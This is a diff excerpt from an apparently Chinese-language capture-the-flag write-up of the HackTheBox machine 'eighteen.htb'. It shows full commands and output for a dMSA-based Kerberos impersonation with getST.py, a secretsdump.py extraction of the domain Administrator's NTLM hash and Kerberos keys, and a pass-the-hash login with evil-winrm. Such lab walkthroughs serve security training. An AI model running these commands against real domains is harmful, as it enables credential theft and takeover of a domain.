@@ -378,3 +378,50 @@ Akamai 博客提供了详细的利用步骤。我们参考官方的 writeup http
 
 运行 `getST.py` 针对提升后的后继对象 `web_svc$` :
 
+```bash
+./ft.sh 240.0.0.1 \
+getST.py eighteen.htb/adam.scott \
+        -impersonate 'web_svc$' \
+        -self \
+        -dmsa \
+        -k -no-pass \
+        -dc-ip 240.0.0.1
+```
+
+### 哈希导出
+
+手持提升后的 TGS（与管理员关联），我们使用 secretsdump.py 导出哈希信息：
+
+```
+$ export KRB5CCNAME="web_svc\$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache"
+
+$ ./ft.sh 240.0.0.1 \
+secretsdump.py EIGHTEEN.HTB/web_svc\$@dc01.eighteen.htb \
+      -k -no-pass \
+      -dc-ip 240.0.0.1 \
+      -target-ip 240.0.0.1 \
+      -just-dc-user Administrator
+  
+[*] Querying offset from: 240.0.0.1
+[*] faketime -f format: +25200.649301
+25200.649301s
+[*] Running: secretsdump.py EIGHTEEN.HTB/web_svc$@dc01.eighteen.htb -k -no-pass -dc-ip 240.0.0.1 -target-ip 240.0.0.1 -just-dc-user Administrator
+Impacket v0.14.0.dev0+20251107.4500.2f1d6eb2 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:0b133be956bfaddf9cea56701affddec:::
+[*] Kerberos keys grabbed
+Administrator:0x14:977d41fb9cb35c5a28280a6458db3348ed1a14d09248918d182a9d3866809d7b
+Administrator:0x13:5ebe190ad8b5efaaae5928226046dfc0
+Administrator:aes256-cts-hmac-sha1-96:1acd569d364cbf11302bfe05a42c4fa5a7794bab212d0cda92afb586193eaeb2
+Administrator:aes128-cts-hmac-sha1-96:7b6b4158f2b9356c021c2b35d000d55f
+Administrator:0x17:0b133be956bfaddf9cea56701affddec
+[*] Cleaning up...
+```
+
+然后执行 PTH 会话
+
+```bash
+evil-winrm -i dc01.eighteen.htb -u administrator -H 0b133be956bfaddf9cea56701affddec
+```
